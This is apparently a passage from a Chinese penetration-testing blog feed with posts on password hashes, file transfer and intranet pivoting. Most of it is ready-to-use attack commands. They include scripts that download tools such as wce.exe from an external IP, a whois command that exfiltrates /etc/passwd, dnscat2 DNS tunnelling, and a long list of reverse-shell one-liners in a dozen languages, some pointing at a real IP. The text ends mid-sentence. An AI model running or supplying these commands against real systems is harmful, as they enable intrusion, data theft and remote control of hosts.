        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>哈希函数，亦称为哈希算法或散列函数<br>能给一个任意大小的文件提取指纹。一般情况下，不同文件，哈希函数提取到的指纹是不一样的</p><hr><h3 id="Hash作用"><a href="#Hash作用" class="headerlink" title="Hash作用"></a>Hash作用</h3><ul><li>文件校验</li><li>授权校验</li><li>基于口令的加密</li><li>消息验证码</li><li>数字签名</li><li>伪随机数生成器</li><li>一次性口令</li></ul><hr><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><ul><li>压缩性</li><li>单向性</li><li>理论无碰撞性<blockquote><ul><li>弱无碰撞性：对于给定的x，要找到一个y，并且满足y!=x且h(x)=h(y)，在计算上不可行</li><li>强无碰撞性：找到任意一对数(x,y)，要满足y!=x且h(x)=h(y)，在计算上不可行</li></ul></blockquote></li></ul><hr><h3 id="加密方式"><a href="#加密方式" class="headerlink" title="加密方式"></a>加密方式</h3><h4 id="普通网站"><a href="#普通网站" class="headerlink" title="普通网站"></a>普通网站</h4><ul><li><code>md5($str)</code>  此方式使用最多</li><li><code>md5($str.$salt)</code></li><li><code>md5($salt.$str)</code></li><li><code>sha1($str)</code></li><li><code>sha1($str.$salt)</code></li><li><code>sha1($salt.$str)</code></li></ul><hr><h4 id="常见CMS后台数据库"><a href="#常见CMS后台数据库" class="headerlink" title="常见CMS后台数据库"></a>常见CMS后台数据库</h4><ul><li>WordPress：生成用户密码时，随机产生了一个salt，将salt与password相加，进行count次md5，最后和encoded64的hash数值累加，得到一个以P开头的密码</li><li>Dedecms：32位MD5减去头5位，减去尾7位，得到20位</li><li>Joomla：<code>MD5($pass.$salt)</code></li><li>Vbulletin;IceBB;Discus：<code>MD5(MD5($password).$salt)</code></li><li>osCommerce：<code>MD5($salt.pass)</code></li><li>TBDev：<code>MD5($salt.$pass.$salt)</code></li><li>ipb;mybb：<code>MD5(MD5($salt).MD5($salt))</code></li></ul><hr><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>例如：<br>MySQL 4.1版本之前是MySQL323加密，MySQL 4.1和之后的版本都是MySQL SHA1加密<br>MySQL数据库中自带Old_Password(str)和Password(str)函数，它们均可以MySQL数据库里进行查询，前者是MySQL323加密，后者是MySQL SHA1方式加密</p><ol><li><p>以MySQL323方式：</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> old_password(<span class="hljs-string">'123'</span>);<br></code></pre></td></tr></table></figure></li><li><p>以MySQL SHA1方式：</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span>(<span class="hljs-string">'123'</span>)/<span class="hljs-keyword">SHA</span><span class="hljs-number">-1</span>(<span class="hljs-keyword">SHA</span><span class="hljs-number">-1</span>($pass))<br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h4><ul><li>LM哈希原理：</li></ul><ol><li>将用户明文转换称<code>大写</code></li><li>将大写明文转换成<code>16进制</code>，并固定长度位<code>14字节</code>，不足用<code>0x00补齐</code></li><li>将16进制分为<code>2组</code>，每组<code>7字节</code></li><li>分别将两组数据，用<code>str_to_key()</code>函数处理，得到<code>两组8字节</code>数据</li><li>两组8字节数据将作为<code>DESKEY</code>对魔术字符串<code>KGS!@#$%</code>进行标准DES加密</li><li>将加密后的这两组数据简单拼接，得到最后的<code>LM Hash</code></li></ol><ul><li>NTLM：<br>与LM哈希算法相比：</li><li>明文口令大小写敏感</li><li>无法根据NTLM Hash判断原始明文口令是否小于8字节</li><li>摆脱了魔术字符串</li><li>MD4是真正的单项哈希函数，穷举作为数据源出现的明文，难度较大</li></ul><hr><h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><p>其中shadow中存放的密码密文格式形如：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$id</span><span class="hljs-variable">$salt</span><span class="hljs-variable">$encrypted</span><br></code></pre></td></tr></table></figure></p><ul><li><p><code>id</code>是指使用的哈希算法，可取如下值：</p><blockquote><p><code>1</code>： MD5<br><code>2a</code>：Blowfish(not in mainline glibc;added in some)<br><code>5</code>： SHA-256(since glibc 2.7)<br><code>6</code>： SHA-512(since glibc 2.7)</p></blockquote></li><li><p><code>salt</code>是使用上面HASH算法对密码进行HASH的一个干扰值</p></li><li><code>encrypted</code>即密码的Hash</li></ul><hr><h3 id="Hash的获取"><a href="#Hash的获取" class="headerlink" title="Hash的获取"></a>Hash的获取</h3><p>抓住Hash密文</p><ol><li>通过SQL注入漏洞获取密文（针对web应用）</li><li>嗅探、抓包拦截等获取（针对网络环境）</li><li>SAM文件或者内存信息获取（Windows环境）</li><li>以root权限读取shadow文件（Linux环境）</li></ol><hr><h3 id="Hash的破解"><a href="#Hash的破解" class="headerlink" title="Hash的破解"></a>Hash的破解</h3><ol><li>在线查找Hash破解</li><li>本地查找Hash破解</li><li>基于SAM文件破解</li><li>基于读取内存信息的破解</li><li>破解Linux口令我呢见</li><li>其它破解工具</li></ol><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>彩虹表</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hash </tag>
            
            <tag> Encryption </tag>
            
            <tag> Decryption </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件传输</title>
      <link href="/2019/03/01/File-transfer/"/>
      <url>/2019/03/01/File-transfer/</url>
      
        <content type="html"><![CDATA[<h3 id="常见文件传输方法"><a href="#常见文件传输方法" class="headerlink" title="常见文件传输方法"></a>常见文件传输方法</h3><p>搬运自：<a href="https://0d4y.cc/2018/09/07/2018-09-06-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener"><strong><code>0d4y</code></strong></a></p><h4 id="wput"><a href="#wput" class="headerlink" title="wput"></a>wput</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wput dir_name ftp://linuxpig:123456@host.com/<br></code></pre></td></tr></table></figure><h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://site.com/1.rar -O 1.rar<br></code></pre></td></tr></table></figure><h4 id="ariac2"><a href="#ariac2" class="headerlink" title="ariac2"></a>ariac2</h4><p>需安装<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2<br></code></pre></td></tr></table></figure></p><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$p</span> = New-Object System.Net.WebClient <span class="hljs-variable">$p</span>.DownloadFile(<span class="hljs-string">"http://domain/file"</span>,<span class="hljs-string">"C:%homepath%file"</span>)<br></code></pre></td></tr></table></figure><h4 id="vbs脚本"><a href="#vbs脚本" class="headerlink" title="vbs脚本"></a>vbs脚本</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Set post=CreateObject(<span class="hljs-string">"Msxml2.XMLHTTP"</span>)<br>post.Open <span class="hljs-string">"GET"</span>,<span class="hljs-string">"http://111.230.170.95/passwd"</span><br><span class="hljs-string">'发送请求<br>post.Send()<br>Set aGet = CreateObject("ADODB.Stream")<br>aGet.Mode = 3<br>aGet.Type = 1<br>aGet.Open()<br>'</span>等待3秒，等文件下载<br><span class="hljs-string">'wscript.sleep 3000 <br>aGet.Write(post.responseBody)'</span>写数据<br>aGet.SaveToFile <span class="hljs-string">"passwd"</span>,2<br></code></pre></td></tr></table></figure><p><code>cscript test.vbs</code></p><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#!/usr/bin/perl</span><br>use LWP::Simple;<br>getstore(“http://domain/file<span class="hljs-string">", “file”);</span><br></code></pre></td></tr></table></figure><p>执行：<code>perl test.pl</code></p><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#!/usr/bin/python</span><br>import urllib2<br>u = urllib2.urlopen(‘http://192.168.20.149/ds.exe<span class="hljs-string">')<br>localFile = open(‘local_file’, ‘w’)<br>localFile.write(u.read())<br>localFile.close()<br>执行：python test.py</span><br></code></pre></td></tr></table></figure><h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#!/usr/bin/ruby</span><br>require ‘net/http’<br>Net::HTTP.start(“www.domain.com<span class="hljs-string">") &#123; |http|<br>r = http.get(“/file”)<br>open(“save_location”, “wb”) &#123; |file|<br>file.write(r.body)<br>&#125;<br>&#125;</span><br></code></pre></td></tr></table></figure><p>执行：<code>ruby test.rb</code></p><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#!/usr/bin/php</span><br>&lt;?php<br><span class="hljs-variable">$data</span> = @file(<span class="hljs-string">"http://111.230.170.95/passwd"</span>);<br><span class="hljs-variable">$lf</span> = “passwd”;<br><span class="hljs-variable">$fh</span> = fopen(<span class="hljs-variable">$lf</span>, ‘w’);<br>fwrite(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$data</span>[0]);<br>fclose(<span class="hljs-variable">$fh</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行：<code>php test.php</code></p><h4 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h4><ul><li><p>attacker</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat file | nc -l 1234<br></code></pre></td></tr></table></figure></li><li><p>target</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc host_ip 1234 &gt; file<br></code></pre></td></tr></table></figure></li></ul><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp 127.0.0.1 username password get file <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><h4 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server<br></code></pre></td></tr></table></figure><h4 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://domain/file c:%homepath%file<br>bitsadmin /transfer down /download /priority normal <span class="hljs-string">"http://111.230.170.95/wce.exe"</span> D:\wce.exe<br></code></pre></td></tr></table></figure><h4 id="Window-文件共享"><a href="#Window-文件共享" class="headerlink" title="Window 文件共享"></a>Window 文件共享</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use x: \127.0.0.1\share /user:example.comuserID myPassword<br>net use u: \\192.168.20.201\gong<br>administrator<br>Hello123<br></code></pre></td></tr></table></figure><h4 id="SCP"><a href="#SCP" class="headerlink" title="SCP"></a>SCP</h4><ul><li><p>本地到远程</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp file user@host.com:/tmp<br></code></pre></td></tr></table></figure></li><li><p>远程到本地</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp user@host.com:/tmp file<br></code></pre></td></tr></table></figure></li></ul><h4 id="rsync"><a href="#rsync" class="headerlink" title="rsync"></a>rsync</h4><ul><li><p>远程rsync服务器中拷贝文件到本地机</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rsync -av root@192.168.78.192::www /databack<br></code></pre></td></tr></table></figure></li><li><p>本地机器拷贝文件到远程rsync服务器</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rsync -av /databack root@192.168.78.192::www<br></code></pre></td></tr></table></figure></li></ul><h4 id="certuuil-exe"><a href="#certuuil-exe" class="headerlink" title="certuuil.exe"></a>certuuil.exe</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certutil.exe -urlcache -split -f http://site.com/file<br></code></pre></td></tr></table></figure><hr><h4 id="icmp传输反弹shell"><a href="#icmp传输反弹shell" class="headerlink" title="icmp传输反弹shell"></a>icmp传输反弹shell</h4><p>工具<code>nishang</code>、<code>icmpsh</code></p><ol><li><p>忽略icmp回显</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl -w net.ipv4.icmp_echo_ignore_all=1<br></code></pre></td></tr></table></figure></li><li><p>开启icmp监听</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python icmpsh_m.py 192.168.158.133 192.168.158.128<br></code></pre></td></tr></table></figure></li><li><p>进入nishang\Shells路径</p></li></ol><ul><li><p>Powershell加载并运行</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-module .\Invoke-PowerShellIcmp.ps1<br>Invoke-PowerShellIcmp<br>192.168.158.133<br></code></pre></td></tr></table></figure></li><li><p>cmd中运行Powershell加载并运行</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"import-module .\Invoke-PowerShellIcmp.ps1;Invoke-PowerShellIcmp 192.168.158.133"</span><br></code></pre></td></tr></table></figure></li></ul><hr><h4 id="whois传输"><a href="#whois传输" class="headerlink" title="whois传输"></a>whois传输</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 传输机base64加密（无空格，不易产生歧义）</span><br>whois -h 192.168.x.x -p 4444 `cat /etc/passwd | base64`<br><br><br><span class="hljs-comment"># 接收机base64解密</span><br>nc -lvvp 4444 | sed <span class="hljs-string">"s/ //g"</span> | base64 -d<br></code></pre></td></tr></table></figure><hr><h3 id="DNS传输"><a href="#DNS传输" class="headerlink" title="DNS传输"></a>DNS传输</h3><ol><li><p>外网server端</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/iagox86/dnscat2.git<br><span class="hljs-built_in">cd</span> server<br>gem install bundler<br>bundle install<br>ruby .dnscat2.rb<br>./dnscat --dns server=x.x.x.x,port=53 --secret=32fjafja[fjoas<br><br><span class="hljs-comment"># 需要ruby环境，若无法安装ruby，尝试命令：</span><br>apt install ruby-dev<br></code></pre></td></tr></table></figure></li><li><p>Kali client端</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/iagox86/dnscat2.git<br><span class="hljs-built_in">cd</span> client<br>make<br>./dnscat --dns server=x.x.x.x,port=53 --secret=32fjafja[fjoas<br></code></pre></td></tr></table></figure></li><li><p>Windows client端<br>下载工具Dnscat2.exe</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip<br>dnscat2-v0.07-client-win32.exe --dns server=x.x.x.x --secret=32fjafja[fjoas<br></code></pre></td></tr></table></figure></li><li><p>外网server端控制shell</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnscat2&gt;<br><span class="hljs-built_in">help</span><br>windows<br>window -i 1<br>shell<br>session -i 2<br>whoami<br></code></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> File </tag>
            
            <tag> Transfer </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内网转发</title>
      <link href="/2019/02/26/Intranet-forwarding/"/>
      <url>/2019/02/26/Intranet-forwarding/</url>
      
        <content type="html"><![CDATA[<h2 id="内网转发目的"><a href="#内网转发目的" class="headerlink" title="内网转发目的"></a>内网转发目的</h2><p>渗透测试中，我们往往会面对十分复杂的内网环境。比如最常用的防火墙，它会限制特定端口的让A和C数据包出入<br>最典型的解释是：<br>A可以访问B的80端口，但不能访问B的3389端口<br>A可以访问B，B可以访问C，但A不能访问C。需要通过B转发数据，让A和C进行通信</p><p><img src="/images/Intranet_eg01.jpg" alt="内网示意图"></p><hr><h2 id="知识基础"><a href="#知识基础" class="headerlink" title="知识基础"></a>知识基础</h2><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>代理通常是指正向代理。正向代理的过程，隐藏了真实的请求客户端，服务端不知道真实客户端身份，哭护短请求的服务都被代理服务器代替来请求</p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理是相对于服务器而言。例如：当请求<code>www.baidu.com</code>时，背后可能有成千上万台服务器为我们服务，但具体是哪一台则不得而知。此时<code>www.baidu.com</code>就是反向代理服务器，反向代理服务器会帮我们将请求转发到真实的服务器。比如<code>负载均衡</code></p><hr><h2 id="内网转发三种形式"><a href="#内网转发三种形式" class="headerlink" title="内网转发三种形式"></a>内网转发三种形式</h2><h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><ul><li>Windows反弹Shell：<code>nc</code></li><li>Linux反弹Shell：<code>nc</code></li></ul><p>shell: <code>ksh</code>  <code>socat</code><br>udp接收：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat udp-listen:5555 -<br></code></pre></td></tr></table></figure></p><hr><h4 id="Msfvenom生成"><a href="#Msfvenom生成" class="headerlink" title="Msfvenom生成"></a>Msfvenom生成</h4><p>msfvenom生成任意类型反弹shell代码<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -l payloads | grep windows<br>msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.20.92 LPORT=5555<br></code></pre></td></tr></table></figure></p><hr><h4 id="Linux常用反弹shell代码"><a href="#Linux常用反弹shell代码" class="headerlink" title="Linux常用反弹shell代码"></a>Linux常用反弹shell代码</h4><ol><li><p>发送文件(公网发内网)<br>文件发送端：<code>nc -lp 6666 &lt; 文件</code><br>文件接收端：<code>nc 发送端ip 发送端端口 &gt; 新文件</code></p></li><li><p>发送文件(内网发公网)<br>文件发送端：<code>nc -lp 6666 &gt; 文件</code><br>文件接收端：<code>nc 发送端ip 发送端端口 &lt; 新文件</code></p></li><li><p>聊天<br>发送端：<code>nc -lp 6666</code><br>接收端：<code>nc 发送端ip 发送端端口</code></p></li><li><p>发送shell<br>发送端(公网服务器)：<code>nc -lvvp 6666 -e /bin/bash</code><br>接收端：<code>nc 发送端ip 发送端攻击者ip</code></p></li><li><p>反弹shell<br>发送端(内网网服务器)：<code>nc 接收端ip 接收端端口 -e /bin/bash</code></p></li><li><p>bash反弹<br>发送端(受害者)：<code>bash -i &gt;&amp; /dev/tcp/111.230.170.95/9985 0&gt;&amp;1</code><br>发送端(受害者)：<code>0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/111.230.170.95/9985;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</code></p></li><li><p>socat反弹(tcp)</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口<br></code></pre></td></tr></table></figure></li><li><p>socat反弹(udp)</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat udp-connect:攻击者ip:端口 <span class="hljs-built_in">exec</span>:<span class="hljs-string">'bash -li'</span>,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;<br></code></pre></td></tr></table></figure></li><li><p>python反弹</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("接收端ip",接收端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></code></pre></td></tr></table></figure></li><li><p>PHP反弹</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("攻击者ip",端口);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure></li><li><p>JAVA反弹</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">r = Runtime.getRuntime()<br>p = r.exec([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/攻击者ip/端口;cat &lt;&amp;5 | while read line; do <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])<br>p.waitFor()<br></code></pre></td></tr></table></figure></li><li><p>perl反弹</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">'use Socket;$i="攻击者ip";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></code></pre></td></tr></table></figure></li><li><p>ruby反弹</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">'exit if fork;c=TCPSocket.new("攻击者ip","端口");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br></code></pre></td></tr></table></figure></li><li><p>telnet反弹</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mknod backpipe p &amp;&amp; telnet 攻击者ip 端口 0&lt;backpipe | /bin/bash 1&gt;backpipe<br></code></pre></td></tr></table></figure></li><li><p>lua反弹(安装lua环境：<code>apt-get install lua*</code>)</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lua -e <span class="hljs-string">"local s=require('socket');local t=assert(s.tcp());t:connect('攻击者ip',端口);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"</span><br></code></pre></td></tr></table></figure></li><li><p>awk反弹</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">'BEGIN&#123;s="/inet/tcp/0/攻击者ip/端口";while(1)&#123;do&#123;s|&amp;getline c;if(c)&#123;while((c|&amp;getline)&gt;0)print $0|&amp;s;close(c)&#125;&#125;while(c!="exit");close(s)&#125;&#125;'</span><br></code></pre></td></tr></table></figure></li><li><p>ksh反弹</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ksh -c <span class="hljs-string">'ksh &gt;/dev/tcp/攻击者ip/端口 2&gt;&amp;1 &lt;&amp;1'</span><br></code></pre></td></tr></table></figure></li></ol><p>Tip：注意接收端空换行可能导致断开连接</p><hr><h3 id="反弹端口"><a href="#反弹端口" class="headerlink" title="反弹端口"></a>反弹端口</h3><ul><li><code>LCX</code></li><li><code>reduh</code><blockquote><p>Mstsc客户端 =&gt; reDuh代理 =&gt; HTTP tunne =&gt; Web服务器 =&gt; 3389</p></blockquote></li></ul><p>Lcx<br>监听5555端口，转发至12345端口<br>./lcx -listen 5555 12345<br>转发本机80端口，至外网111.230.170.95 的 5555端口<br>./lcx -slave 111.230.170.95 5555 127.0.0.1 80</p><hr><h4 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h4><p><img src="/images/Intranet_eg02.jpg" alt="参考示例内网环境"></p><p>环境：<br>172.16.39.141(A)不能访问192.18.20.x网段，但可以访问172.16.39.x的内网机器（B），同时80端口只能本地访问，但是8080端口对外开放<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 被控制服务器A的80端口转发到本地8080端口</span><br>lcx -tran 8080 127.0.0.1 80<br><br><span class="hljs-comment"># 使用双网卡的边界主机B，与内网主机A的8080端口建立连接</span><br><span class="hljs-comment"># A：172.16.39.207</span><br><span class="hljs-comment"># B：172.16.39.141</span><br>lcx -slave 172.16.39.207 4444 172.16.39.141 8080<br><br><span class="hljs-comment"># 在边界主机B上监听端口4444，并将监听到的内容发送到12345</span><br>lcx -listen 4444 12345<br><br><span class="hljs-comment"># 外网机器访问边界主机B的外网地址的12345端口</span><br>curl http://192.168.20.198:12345<br></code></pre></td></tr></table></figure></p><hr><h3 id="反弹代理"><a href="#反弹代理" class="headerlink" title="反弹代理"></a>反弹代理</h3><p>有时需要对内网进行更深一步的扫描和渗透，此时需要设置一个代理服务器，充当外网和内网数据转发的节点，即反弹代理，也称为反弹socket</p><h4 id="利用系统服务"><a href="#利用系统服务" class="headerlink" title="利用系统服务"></a>利用系统服务</h4><ul><li><p><code>http tunnel</code></p><blockquote><p>reduh tunna 用来反弹端口<br>reGeorg反弹代理</p></blockquote></li><li><p><code>ssh 